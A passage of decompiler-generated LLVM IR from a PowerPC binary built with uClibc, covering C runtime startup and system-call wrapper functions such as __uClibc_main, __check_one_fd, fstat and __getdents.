  store i32 %v1_1000cff0, i32* @r9, align 4
  %v2_1000cff8 = sub i32 %v1_1000cff8, %v3_1000cfec
  store i32 %v2_1000cff8, i32* @r8, align 4
  %v3_1000d00c = icmp eq i32 %v2_1000cff8, 0
  br i1 %v3_1000d00c, label %dec_label_pc_1000d014, label %dec_label_pc_1000cfec

dec_label_pc_1000d014:                            ; preds = %dec_label_pc_1000cfec
  %v0_1000d018 = call i32 @unknown_10000000()
  br label %dec_label_pc_1000d01c

dec_label_pc_1000cf98.dec_label_pc_1000d01c.loopexit_crit_edge: ; preds = %dec_label_pc_1000cfc4
  br label %dec_label_pc_1000d01c

dec_label_pc_1000d01c:                            ; preds = %entry, %dec_label_pc_1000cf98.dec_label_pc_1000d01c.loopexit_crit_edge, %dec_label_pc_1000cfcc, %dec_label_pc_1000d014
  %v0_1000d028 = phi i32 [ %v0_1000cf80, %dec_label_pc_1000cfcc ], [ %v0_1000d018, %dec_label_pc_1000d014 ], [ %v0_1000cf80, %dec_label_pc_1000cf98.dec_label_pc_1000d01c.loopexit_crit_edge ], [ %v3_1000cf90, %entry ]
  ret i32 %v0_1000d028

; uselistorder directives
  uselistorder i32 %v2_1000cff8, { 1, 2, 0 }
  uselistorder i32 %v1_1000cf98, { 2, 0, 1 }
  uselistorder i32 %v3_1000cf90, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000cf80, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 132, { 2, 3, 0, 1 }
  uselistorder i32 -29264, { 1, 0 }
  uselistorder i32 -29676, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000d01c, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000cfa4, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000d03c = add i32 %tmp, 4
  %v3_1000d03c = inttoptr i32 %v2_1000d03c to i32*
  store i32 %arg3, i32* %v3_1000d03c, align 4
  store i32 %arg2, i32* %arg1, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000d048 = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* @r9, align 4
  br i1 %v3_1000d048, label %dec_label_pc_1000d070, label %dec_label_pc_1000d060

dec_label_pc_1000d060:                            ; preds = %entry
  %v2_1000d060 = load i32, i32* %arg1, align 4
  store i32 %v2_1000d060, i32* @r9, align 4
  %v1_1000d06c = call i32 @__libc_errno()
  br label %dec_label_pc_1000d070

dec_label_pc_1000d070:                            ; preds = %entry, %dec_label_pc_1000d060
  %v0_1000d07c = phi i32 [ %tmp, %entry ], [ %v1_1000d06c, %dec_label_pc_1000d060 ]
  ret i32 %v0_1000d07c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_1000d070, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d0cc:
  store i32 -1, i32* @r31, align 4
  %v3_1000d0d0 = load i32, i32* @global_var_1002123c.546, align 4
  %v3_1000d0d4 = icmp eq i32 %v3_1000d0d0, 0
  br i1 %v3_1000d0d4, label %dec_label_pc_1000d0e4, label %dec_label_pc_1000d0dc

dec_label_pc_1000d0dc:                            ; preds = %dec_label_pc_1000d0cc
  %v1_1000d0e0 = call i32 @__libc_errno()
  store i32 %v1_1000d0e0, i32* @r3, align 4
  br label %dec_label_pc_1000d0e4

dec_label_pc_1000d0e4:                            ; preds = %dec_label_pc_1000d0cc, %dec_label_pc_1000d0dc
  %v3_1000d0e8 = load i32, i32* @global_var_10021240.547, align 4
  %v3_1000d0ec = icmp eq i32 %v3_1000d0e8, 0
  br i1 %v3_1000d0ec, label %dec_label_pc_1000d0e4.dec_label_pc_1000d0fc_crit_edge, label %dec_label_pc_1000d0f4

dec_label_pc_1000d0e4.dec_label_pc_1000d0fc_crit_edge: ; preds = %dec_label_pc_1000d0e4
  %v0_1000d10c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d0fc

dec_label_pc_1000d0f4:                            ; preds = %dec_label_pc_1000d0e4
  %v1_1000d0f8 = call i32 @__libc_errno()
  br label %dec_label_pc_1000d0fc

dec_label_pc_1000d0fc:                            ; preds = %dec_label_pc_1000d0e4.dec_label_pc_1000d0fc_crit_edge, %dec_label_pc_1000d0f4
  %v0_1000d10c = phi i32 [ %v0_1000d10c.pre, %dec_label_pc_1000d0e4.dec_label_pc_1000d0fc_crit_edge ], [ %v1_1000d0f8, %dec_label_pc_1000d0f4 ]
  ret i32 %v0_1000d10c

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000d0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0e4, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r4, align 4
  store i32 268489012, i32* @lr, align 4
  %v1_1000d130 = call i32 @__libc_fcntl(i32 1)
  %v3_1000d134 = icmp eq i32 %v1_1000d130, -1
  br i1 %v3_1000d134, label %dec_label_pc_1000d13c, label %dec_label_pc_1000d15c

dec_label_pc_1000d13c:                            ; preds = %entry
  %v0_1000d140 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_10010c50.548 to i32), i32* @r3, align 4
  %v3_1000d14c = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_10010c50.548 to i32), i32 %v0_1000d140)
  %v1_1000d150 = load i32, i32* @r31, align 4
  %v4_1000d150 = icmp eq i32 %v3_1000d14c, %v1_1000d150
  br i1 %v4_1000d150, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d158

dec_label_pc_1000d158:                            ; preds = %dec_label_pc_1000d13c
  %v0_1000d158 = call i32 @abort()
  br label %dec_label_pc_1000d15c

dec_label_pc_1000d15c:                            ; preds = %entry, %dec_label_pc_1000d13c, %dec_label_pc_1000d158
  %v0_1000d16c = phi i32 [ %v1_1000d130, %entry ], [ %v3_1000d14c, %dec_label_pc_1000d13c ], [ %v0_1000d158, %dec_label_pc_1000d158 ]
  ret i32 %v0_1000d16c

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_1000d15c, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000d184 = load i32, i32* @global_var_10021238.549, align 4
  %v3_1000d188 = icmp eq i32 %v3_1000d184, 0
  br i1 %v3_1000d188, label %dec_label_pc_1000d190, label %entry.dec_label_pc_1000d1c0_crit_edge

entry.dec_label_pc_1000d1c0_crit_edge:            ; preds = %entry
  %v0_1000d1d0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d1c0

dec_label_pc_1000d190:                            ; preds = %entry
  %v0_1000d170 = load i32, i32* @lr, align 4
  store i32 4096, i32* @global_var_10021238.549, align 4
  %v1_1000d198 = call i32 @__pthread_initialize_minimal(i32 268566528)
  store i32 %v0_1000d170, i32* @lr, align 4
  %v2_1000d1bc = call i32 @_stdio_init(i32 %v1_1000d198, i32 268494356)
  br label %dec_label_pc_1000d1c0

dec_label_pc_1000d1c0:                            ; preds = %entry.dec_label_pc_1000d1c0_crit_edge, %dec_label_pc_1000d190
  %v0_1000d1d0 = phi i32 [ %v0_1000d1d0.pre, %entry.dec_label_pc_1000d1c0_crit_edge ], [ %v2_1000d1bc, %dec_label_pc_1000d190 ]
  ret i32 %v0_1000d1d0

; uselistorder directives
  uselistorder label %dec_label_pc_1000d1c0, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-664 = alloca i32, align 4
  %v1_1000d1e0 = mul i32 %arg2, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  %v1_1000d1f4 = add i32 %tmp, 4
  %v2_1000d1f8 = load i32, i32* %arg3, align 4
  %v2_1000d1fc = add i32 %v1_1000d1f4, %v1_1000d1e0
  %v4_1000d204 = icmp eq i32 %v2_1000d1fc, %v2_1000d1f8
  %v0_1000d208 = load i32, i32* @r9, align 4
  store i32 %v0_1000d208, i32* @global_var_10021230.550, align 4
  store i32 %arg6, i32* @global_var_10021240.547, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 %v2_1000d1fc, i32* @global_var_10021234.551, align 4
  br i1 %v4_1000d204, label %dec_label_pc_1000d22c, label %dec_label_pc_1000d238

dec_label_pc_1000d22c:                            ; preds = %entry
  store i32 %tmp, i32* @r8, align 4
  %v2_1000d230 = add i32 %tmp, %v1_1000d1e0
  store i32 %v2_1000d230, i32* @global_var_10021234.551, align 4
  br label %dec_label_pc_1000d238

dec_label_pc_1000d238:                            ; preds = %entry, %dec_label_pc_1000d22c
  %v2_1000d23c = ptrtoint i32* %stack_var_-664 to i32
  store i32 268489288, i32* @lr, align 4
  %v3_1000d244 = call i32 @__GI_memset(i32 %v2_1000d23c, i32 0, i32 120)
  %v3_1000d248 = load i32, i32* @global_var_10021234.551, align 4
  br label %dec_label_pc_1000d254

dec_label_pc_1000d254:                            ; preds = %dec_label_pc_1000d254, %dec_label_pc_1000d238
  %storemerge = phi i32 [ %v3_1000d248, %dec_label_pc_1000d238 ], [ %v1_1000d260, %dec_label_pc_1000d254 ]
  %v1_1000d254 = inttoptr i32 %storemerge to i32*
  %v2_1000d254 = load i32, i32* %v1_1000d254, align 4
  %v3_1000d258 = icmp eq i32 %v2_1000d254, 0
  %v1_1000d260 = add i32 %storemerge, 4
  br i1 %v3_1000d258, label %dec_label_pc_1000d260, label %dec_label_pc_1000d254

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d254
  store i32 %v1_1000d260, i32* %r29.global-to-local, align 4
  store i32 %v2_1000d23c, i32* @r31, align 4
  %v1_1000d28c12 = inttoptr i32 %v1_1000d260 to i32*
  %v2_1000d28c13 = load i32, i32* %v1_1000d28c12, align 4
  %v3_1000d29016 = icmp eq i32 %v2_1000d28c13, 0
  br i1 %v3_1000d29016, label %dec_label_pc_1000d298, label %dec_label_pc_1000d26c

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d260, %dec_label_pc_1000d288
  %v0_1000d278 = phi i32 [ %v1_1000d288, %dec_label_pc_1000d288 ], [ %v1_1000d260, %dec_label_pc_1000d260 ]
  %v0_1000d274 = phi i32 [ %v2_1000d28c, %dec_label_pc_1000d288 ], [ %v2_1000d28c13, %dec_label_pc_1000d260 ]
  %v2_1000d26c = icmp ugt i32 %v0_1000d274, 14
  br i1 %v2_1000d26c, label %dec_label_pc_1000d288, label %dec_label_pc_1000d274

dec_label_pc_1000d274:                            ; preds = %dec_label_pc_1000d26c
  %v1_1000d274 = mul i32 %v0_1000d274, 8
  store i32 %v0_1000d278, i32* @r4, align 4
  %v0_1000d27c = load i32, i32* @r31, align 4
  %v2_1000d27c = add i32 %v0_1000d27c, %v1_1000d274
  store i32 %v2_1000d27c, i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  store i32 268489352, i32* @lr, align 4
  %v0_1000d284 = call i32 @memcpy()
  %v0_1000d288.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d288

dec_label_pc_1000d288:                            ; preds = %dec_label_pc_1000d26c, %dec_label_pc_1000d274
  %v0_1000d288 = phi i32 [ %v0_1000d278, %dec_label_pc_1000d26c ], [ %v0_1000d288.pre, %dec_label_pc_1000d274 ]
  %v1_1000d288 = add i32 %v0_1000d288, 8
  store i32 %v1_1000d288, i32* %r29.global-to-local, align 4
  %v1_1000d28c = inttoptr i32 %v1_1000d288 to i32*
  %v2_1000d28c = load i32, i32* %v1_1000d28c, align 4
  %v3_1000d290 = icmp eq i32 %v2_1000d28c, 0
  br i1 %v3_1000d290, label %dec_label_pc_1000d298, label %dec_label_pc_1000d26c

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d288, %dec_label_pc_1000d260
  %v1_1000d29c = call i32 @_dl_aux_init(i32 %v2_1000d23c)
  store i32 %v1_1000d29c, i32* @r3, align 4
  store i32 268489380, i32* @lr, align 4
  %v1_1000d2a0 = call i32 @__GI___uClibc_init(i32 %v1_1000d29c)
  %v3_1000d2a8 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000d2a8, label %dec_label_pc_1000d2b0, label %dec_label_pc_1000d2b4

dec_label_pc_1000d2b0:                            ; preds = %dec_label_pc_1000d298
  br label %dec_label_pc_1000d2b4

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d298, %dec_label_pc_1000d2b0
  %v0_1000d2bc = phi i32 [ %tmp27, %dec_label_pc_1000d298 ], [ 4096, %dec_label_pc_1000d2b0 ]
  store i32 %v0_1000d2bc, i32* @global_var_10021238.549, align 4
  %v3_1000d2c0 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000d2c0, label %dec_label_pc_1000d2c8, label %dec_label_pc_1000d2fc

dec_label_pc_1000d2c8:                            ; preds = %dec_label_pc_1000d2b4
  %v1_1000d2c8 = call i32 @getuid(i32 268566528)
  store i32 %v1_1000d2c8, i32* %r29.global-to-local, align 4
  %v0_1000d2d0 = call i32 @geteuid()
  %v4_1000d2d4 = icmp eq i32 %v1_1000d2c8, %v0_1000d2d0
  br i1 %v4_1000d2d4, label %dec_label_pc_1000d2dc, label %dec_label_pc_1000d318

dec_label_pc_1000d2dc:                            ; preds = %dec_label_pc_1000d2c8
  %v1_1000d2dc = call i32 @getgid(i32 %v0_1000d2d0)
  store i32 %v1_1000d2dc, i32* %r29.global-to-local, align 4
  %v0_1000d2e4 = call i32 @getegid()
  %v4_1000d2e8 = icmp eq i32 %v1_1000d2dc, %v0_1000d2e4
  br i1 %v4_1000d2e8, label %dec_label_pc_1000d2f0.thread, label %dec_label_pc_1000d318

dec_label_pc_1000d2f0.thread:                     ; preds = %dec_label_pc_1000d2dc
  br label %dec_label_pc_1000d348

dec_label_pc_1000d2fc:                            ; preds = %dec_label_pc_1000d2b4
  %v4_1000d300 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000d300, label %dec_label_pc_1000d308, label %dec_label_pc_1000d318

dec_label_pc_1000d308:                            ; preds = %dec_label_pc_1000d2fc
  %v4_1000d310 = icmp eq i32 %tmp24, %tmp23
  br i1 %v4_1000d310, label %dec_label_pc_1000d348, label %dec_label_pc_1000d318

dec_label_pc_1000d318:                            ; preds = %dec_label_pc_1000d2fc, %dec_label_pc_1000d2dc, %dec_label_pc_1000d2c8, %dec_label_pc_1000d308
  store i32 268489512, i32* @lr, align 4
  %v2_1000d324 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268489528, i32* @lr, align 4
  %v2_1000d334 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268489544, i32* @lr, align 4
  %v2_1000d344 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000d348

dec_label_pc_1000d348:                            ; preds = %dec_label_pc_1000d2f0.thread, %dec_label_pc_1000d308, %dec_label_pc_1000d318
  %v2_1000d350 = load i32, i32* %arg3, align 4
  store i32 %v2_1000d350, i32* inttoptr (i32 268571048 to i32*), align 8
  %v2_1000d358 = load i32, i32* %arg3, align 4
  store i32 %v2_1000d358, i32* %r29.global-to-local, align 4
  %v3_1000d35c = icmp eq i32 %v2_1000d358, 0
  br i1 %v3_1000d35c, label %dec_label_pc_1000d430, label %dec_label_pc_1000d364

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d348
  store i32 %v2_1000d358, i32* inttoptr (i32 268571056 to i32*), align 16
  %v2_1000d370 = load i32, i32* %arg3, align 4
  store i32 268489592, i32* @lr, align 4
  %v4_1000d374 = call i32 @__GI_strrchr(i32 %v2_1000d370, i32 47, i32 %tmp, i32 268566528)
  %v1_1000d388 = add i32 %v4_1000d374, 1
  store i32 %v1_1000d388, i32* bitcast (i32** @global_var_100211ac.552 to i32*), align 4
  br label %dec_label_pc_1000d430

dec_label_pc_1000d430:                            ; preds = %dec_label_pc_1000d348, %dec_label_pc_1000d364
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000d3bc = load i32, i32* @r27, align 4
  store i32 %v0_1000d3bc, i32* @global_var_1002123c.546, align 4
  %v0_1000d3e0 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000d3e0)
  store i32 ptrtoint (i32* @global_var_10021054.545 to i32), i32* @r30, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* @r29, align 4
  %v0_1000d440 = call i32 @__GI___errno_location()
  %v2_1000d448 = inttoptr i32 %v0_1000d440 to i32*
  store i32 0, i32* %v2_1000d448, align 4
  %v2_1000d468 = ptrtoint i32* %stack_var_-544 to i32
  store i32 268489840, i32* @lr, align 4
  %v1_1000d46c = call i32 @_setjmp(i32 %v2_1000d468)
  %v3_1000d470 = icmp eq i32 %v1_1000d46c, 0
  br i1 %v3_1000d470, label %dec_label_pc_1000d478, label %dec_label_pc_1000d4b4

dec_label_pc_1000d478:                            ; preds = %dec_label_pc_1000d430
  %v0_1000d478 = load i32, i32* @r2, align 4
  %v2_1000d498 = add i32 %v0_1000d478, -29680
  %v3_1000d498 = inttoptr i32 %v2_1000d498 to i32*
  store i32 %v2_1000d468, i32* %v3_1000d498, align 4
  call void @__pseudo_call(i32 %arg1)
  br label %dec_label_pc_1000d518

dec_label_pc_1000d4b4:                            ; preds = %dec_label_pc_1000d430
  %v0_1000d4b4 = call i32 @unknown_10000000()
  %v0_1000d4d0.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000d4c4

dec_label_pc_1000d4c4:                            ; preds = %dec_label_pc_1000d4c4, %dec_label_pc_1000d4b4
  %v0_1000d4d0 = phi i1 [ false, %dec_label_pc_1000d4c4 ], [ %v0_1000d4d0.pr, %dec_label_pc_1000d4b4 ]
  br i1 %v0_1000d4d0, label %dec_label_pc_1000d4d4, label %dec_label_pc_1000d4c4

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4c4
  %v3_1000d4d4 = icmp eq i32* %arg3, inttoptr (i32 1 to i32*)
  br i1 %v3_1000d4d4, label %dec_label_pc_1000d514, label %dec_label_pc_1000d4dc

dec_label_pc_1000d4dc:                            ; preds = %dec_label_pc_1000d4d4
  %v0_1000d4e8 = call i32 @__asm_mfcr()
  %v1_1000d4ec = and i32 %v0_1000d4e8, 268435456
  %v3_1000d4ec = icmp eq i32 %v1_1000d4ec, 0
  br i1 %v3_1000d4ec, label %dec_label_pc_1000d514, label %dec_label_pc_1000d4f8

dec_label_pc_1000d4f8:                            ; preds = %dec_label_pc_1000d4dc
  %v0_1000d504 = load i32, i32* @r2, align 4
  %v1_1000d508 = add i32 %v0_1000d504, -28672
  %v2_1000d50c = inttoptr i32 %v1_1000d508 to i32*
  store i32 %v0_1000d4e8, i32* %v2_1000d50c, align 4
  br label %dec_label_pc_1000d518

dec_label_pc_1000d514:                            ; preds = %dec_label_pc_1000d4dc, %dec_label_pc_1000d4d4
  br label %dec_label_pc_1000d518

dec_label_pc_1000d518:                            ; preds = %dec_label_pc_1000d4f8, %dec_label_pc_1000d478, %dec_label_pc_1000d514
  %v0_1000d518 = call i32 @__GI_exit()
  ret i32 %v0_1000d518

; uselistorder directives
  uselistorder i32 %v2_1000d28c, { 1, 0 }
  uselistorder i32 %v1_1000d288, { 1, 2, 0 }
  uselistorder i32 %v1_1000d1e0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 ()* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @unknown_10000000, { 1, 0, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 0, 8, 7, 6, 4, 3, 5, 2, 1 }
  uselistorder i32* @global_var_100100e8.169, { 1, 0 }
  uselistorder i32 47, { 1, 6, 0, 7, 8, 9, 3, 10, 4, 11, 2, 12, 13, 5, 14 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder label %dec_label_pc_1000d518, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d430, { 1, 0 }
  uselistorder label %dec_label_pc_1000d348, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d318, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d2b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d288, { 1, 0 }
  uselistorder label %dec_label_pc_1000d26c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d238, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000d524 = load i32, i32* @r2, align 4
  %v1_1000d528 = add i32 %v0_1000d524, -28672
  %v0_1000d52c = load i32, i32* @r3, align 4
  %v2_1000d52c = inttoptr i32 %v1_1000d528 to i32*
  store i32 %v0_1000d52c, i32* %v2_1000d52c, align 4
  ret i32 -1
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  %v2_1000d53c = call i32 @__sigsetjmp(i32* null)
  ret i32 %v2_1000d53c
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d54c = load i32, i32* @r2, align 4
  %v1_1000d558 = add i32 %v0_1000d54c, -28672
  store i32 %v1_1000d558, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d55c

dec_label_pc_1000d55c:                            ; preds = %dec_label_pc_1000d55c.backedge, %entry
  %v0_1000d568 = call i32 @__asm_mfcr()
  %v1_1000d56c = and i32 %v0_1000d568, 268435456
  %v3_1000d56c = icmp eq i32 %v1_1000d56c, 0
  br i1 %v3_1000d56c, label %dec_label_pc_1000d584, label %dec_label_pc_1000d580

dec_label_pc_1000d580:                            ; preds = %dec_label_pc_1000d55c
  %v1_1000d580 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d580 = inttoptr i32 %v1_1000d580 to i32*
  store i32 %v0_1000d568, i32* %v2_1000d580, align 4
  br label %dec_label_pc_1000d584

dec_label_pc_1000d584:                            ; preds = %dec_label_pc_1000d55c, %dec_label_pc_1000d580
  %v0_1000d588 = call i32 @__asm_mfcr()
  %v1_1000d58c = and i32 %v0_1000d588, 268435456
  %v3_1000d58c = icmp eq i32 %v1_1000d58c, 0
  br i1 %v3_1000d58c, label %dec_label_pc_1000d55c.backedge, label %dec_label_pc_1000d594

dec_label_pc_1000d594:                            ; preds = %dec_label_pc_1000d584
  %v1_1000d594 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d594 = inttoptr i32 %v1_1000d594 to i32*
  store i32 %v0_1000d588, i32* %v2_1000d594, align 4
  br label %dec_label_pc_1000d55c.backedge

dec_label_pc_1000d55c.backedge:                   ; preds = %dec_label_pc_1000d594, %dec_label_pc_1000d584
  br label %dec_label_pc_1000d55c

; uselistorder directives
  uselistorder label %dec_label_pc_1000d584, { 1, 0 }
}

define i32 @fstat(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-136 = alloca i32, align 4
  %v0_1000d5b0 = load i32, i32* @r4, align 4
  store i32 %v0_1000d5b0, i32* @r31, align 4
  %v0_1000d5c0 = call i32 @__asm_mfcr()
  %v1_1000d5c4 = and i32 %v0_1000d5c0, 268435456
  %v3_1000d5c4 = icmp eq i32 %v1_1000d5c4, 0
  br i1 %v3_1000d5c4, label %dec_label_pc_1000d5e8, label %dec_label_pc_1000d5cc

dec_label_pc_1000d5cc:                            ; preds = %entry
  store i32 -1, i32* @r30, align 4
  %v0_1000d5d8 = load i32, i32* @r2, align 4
  %v1_1000d5dc = add i32 %v0_1000d5d8, -28672
  %v2_1000d5e0 = inttoptr i32 %v1_1000d5dc to i32*
  store i32 %v0_1000d5c0, i32* %v2_1000d5e0, align 4
  br label %dec_label_pc_1000d600

dec_label_pc_1000d5e8:                            ; preds = %entry
  %v3_1000d5e8 = icmp eq i32 %v0_1000d5c0, 0
  store i32 %v0_1000d5c0, i32* @r30, align 4
  br i1 %v3_1000d5e8, label %dec_label_pc_1000d5f4, label %dec_label_pc_1000d600

dec_label_pc_1000d5f4:                            ; preds = %dec_label_pc_1000d5e8
  %v0_1000d5f8 = load i32, i32* @r31, align 4
  store i32 268490240, i32* @lr, align 4
  %v4_1000d5fc = call i32 @__xstat32_conv(i32* nonnull %stack_var_-136, i32 %v0_1000d5f8, i32 0)
  br label %dec_label_pc_1000d600

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5e8, %dec_label_pc_1000d5cc, %dec_label_pc_1000d5f4
  %v0_1000d604 = load i32, i32* @r30, align 4
  ret i32 %v0_1000d604

; uselistorder directives
  uselistorder i32 %v0_1000d5c0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000d600, { 2, 0, 1 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %v0_1000d618 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 141, i32* %r0.global-to-local, align 4
  %v0_1000d634 = call i32 @__asm_mfcr()
  store i32 %v0_1000d634, i32* %r0.global-to-local, align 4
  %v1_1000d638 = and i32 %v0_1000d634, 268435456
  %v3_1000d638 = icmp eq i32 %v1_1000d638, 0
  br i1 %v3_1000d638, label %dec_label_pc_1000d65c, label %dec_label_pc_1000d640

dec_label_pc_1000d640:                            ; preds = %entry
  store i32 -1, i32* @r27, align 4
  %v0_1000d64c = load i32, i32* @r2, align 4
  %v1_1000d650 = add i32 %v0_1000d64c, -28672
  %v2_1000d654 = inttoptr i32 %v1_1000d650 to i32*
  store i32 %v0_1000d634, i32* %v2_1000d654, align 4
  br label %dec_label_pc_1000d6b0

dec_label_pc_1000d65c:                            ; preds = %entry
  %v3_1000d65c = icmp eq i32 %v0_1000d634, -1
  store i32 %v0_1000d634, i32* @r27, align 4
  %v0_1000d664 = load i32, i32* @r31, align 4
  %v2_1000d664 = add i32 %v0_1000d664, %v0_1000d634
  store i32 %v2_1000d664, i32* @r26, align 4
  br i1 %v3_1000d65c, label %dec_label_pc_1000d6b0, label %dec_label_pc_1000d69c.preheader

dec_label_pc_1000d69c.preheader:                  ; preds = %dec_label_pc_1000d65c
  %v2_1000d69c3 = icmp ult i32 %v0_1000d664, %v2_1000d664
  %v1_1000d6a07 = add i32 %v0_1000d664, 10
  store i32 %v1_1000d6a07, i32* @r30, align 4
  %v1_1000d6a88 = add i32 %v0_1000d664, 11
  store i32 %v1_1000d6a88, i32* @r28, align 4
  br i1 %v2_1000d69c3, label %dec_label_pc_1000d670, label %dec_label_pc_1000d6b0

dec_label_pc_1000d670:                            ; preds = %dec_label_pc_1000d69c.preheader, %dec_label_pc_1000d670
  %v0_1000d670 = phi i32 [ %v2_1000d698, %dec_label_pc_1000d670 ], [ %v0_1000d664, %dec_label_pc_1000d69c.preheader ]
  %v1_1000d6a010 = phi i32 [ %v1_1000d6a0, %dec_label_pc_1000d670 ], [ %v1_1000d6a07, %dec_label_pc_1000d69c.preheader ]
  %v1_1000d670 = add i32 %v0_1000d670, 8
  %v2_1000d670 = inttoptr i32 %v1_1000d670 to i16*
  %v3_1000d670 = load i16, i16* %v2_1000d670, align 2
  %v4_1000d670 = zext i16 %v3_1000d670 to i32
  %v2_1000d674 = add i32 %v4_1000d670, %v0_1000d670
  %v1_1000d678 = add i32 %v2_1000d674, -1
  %v2_1000d678 = inttoptr i32 %v1_1000d678 to i8*
  %v3_1000d678 = load i8, i8* %v2_1000d678, align 1
  %v4_1000d678 = zext i8 %v3_1000d678 to i32
  store i32 %v4_1000d678, i32* %r29.global-to-local, align 4
  %v1_1000d67c = inttoptr i32 %v1_1000d6a010 to i8*
  %v2_1000d67c = call i32 @__GI_strlen(i8* %v1_1000d67c)
  %v1_1000d680 = add i32 %v2_1000d67c, 1
  %v0_1000d684 = load i32, i32* @r30, align 4
  %v0_1000d688 = load i32, i32* @r28, align 4
  store i32 268490384, i32* @lr, align 4
  %v3_1000d68c = call i32 @memmove(i32 %v0_1000d688, i32 %v0_1000d684, i32 %v1_1000d680)
  %v0_1000d690 = load i32, i32* @r31, align 4
  %v1_1000d690 = add i32 %v0_1000d690, 8
  %v2_1000d690 = inttoptr i32 %v1_1000d690 to i16*
  %v3_1000d690 = load i16, i16* %v2_1000d690, align 2
  %v4_1000d690 = zext i16 %v3_1000d690 to i32
  store i32 %v4_1000d690, i32* %r0.global-to-local, align 4
  %v0_1000d694 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000d694 = trunc i32 %v0_1000d694 to i8
